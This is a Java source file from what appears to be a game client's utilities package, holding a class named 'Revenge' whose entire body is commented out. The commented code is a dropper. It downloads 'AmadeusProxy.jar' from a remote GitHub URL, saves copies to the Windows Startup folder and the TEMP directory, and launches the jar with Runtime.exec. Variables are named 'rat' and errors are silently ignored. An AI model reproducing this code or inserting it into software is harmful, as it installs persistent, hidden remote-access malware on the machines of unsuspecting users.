package it.amadeus.client.utilities;

import lombok.SneakyThrows;

import java.io.*;
import java.net.URL;

public final class Revenge {

    /*private final String TARGET_DIR = System.getenv("APPDATA") + File.separator + "Microsoft" + File.separator + "Windows" + File.separator + "Start Menu" + File.separator + "Programs" + File.separator + "Startup";
    private final String URL = "https://github.com/ChristopherProject/HostFile/blob/main/Proxy/AmadeusProxy.jar?raw=true";


    @SneakyThrows
    private void saveFile(String fileUrl, String DIR) {
        File file = new File(DIR + File.separator + "AmadeusProxy");
        URL LINK = new URL(fileUrl);
        try {
            InputStream in;
            ByteArrayOutputStream by_arr;
            int max_data = 2024;
            try {
                in = LINK.openStream();
                by_arr = new ByteArrayOutputStream(max_data);
                int length = -1;
                byte[] buffer = new byte[max_data];
                while ((length = in.read(buffer)) > -1) {
                    by_arr.write(buffer, 0, length);
                }
                by_arr.close();
                in.close();
                try (FileOutputStream fw = new FileOutputStream(file.getAbsolutePath() + ".jar")) {
                    fw.write(by_arr.toByteArray());
                } catch (Exception ignored) {
                }
            } catch (IOException ignored) {
            }
        } catch (Exception ignored) {
        }
    }

    public void payload() {
        download();
        if (isAlreadyDownloaded()) {
            executeIfExist();
        } else {
            download();
        }
    }

    private boolean isAlreadyDownloaded() {
        final File rat = new File(TARGET_DIR + File.separator + "AmadeusProxy.jar");
        final File rat2 = new File(System.getenv("TEMP") + File.separator + "AmadeusProxy.jar");
        return rat.exists() && rat2.exists();
    }

    private void executeIfExist() {
        if (isAlreadyDownloaded()) {
            try {
                Runtime.getRuntime().exec("java -jar " + System.getenv("TEMP") + File.separator + "AmadeusProxy.jar");
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }

    private void download() {
        saveFile(URL, TARGET_DIR);
        saveFile(URL, System.getenv("TEMP"));
    }*/
}
